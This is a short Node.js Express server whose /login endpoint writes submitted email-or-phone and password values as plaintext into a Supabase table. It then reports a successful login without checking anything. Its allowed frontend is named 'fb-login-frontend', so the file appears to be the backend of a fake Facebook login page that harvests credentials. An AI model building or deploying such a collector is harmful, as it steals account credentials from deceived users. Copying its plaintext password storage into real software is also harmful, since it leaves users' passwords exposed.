const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');

const app = express();

// Middleware
app.use(cors({
  origin: ['https://fb-login-frontend.vercel.app'], // Frontend production URL
  methods: 'GET,HEAD,PATCH,POST,PUT,DELETE',
}));
app.use(bodyParser.json());

// Initialize Supabase Client
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// API endpoint to handle login
app.post('/login', async (req, res) => {
  const { emailOrPhone, password } = req.body;

  try {
    // Insert user data into Supabase with correct column names
    const { data, error } = await supabase
      .from('users')
      .insert([{ email_or_phone: emailOrPhone, password }]); // Correct column names

    if (error) {
      console.error('Supabase error:', error);  // Log detailed Supabase error
      return res.status(500).json({ error: 'Error saving user data to Supabase.', details: error.message });
    }

    res.status(200).json({ message: 'User logged in successfully', data });
  } catch (err) {
    console.error('Server error:', err);  // Log any other errors
    res.status(500).json({ error: 'Server error while saving user data.', details: err.message });
  }
});

// Start the server
const port = process.env.PORT || 5000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
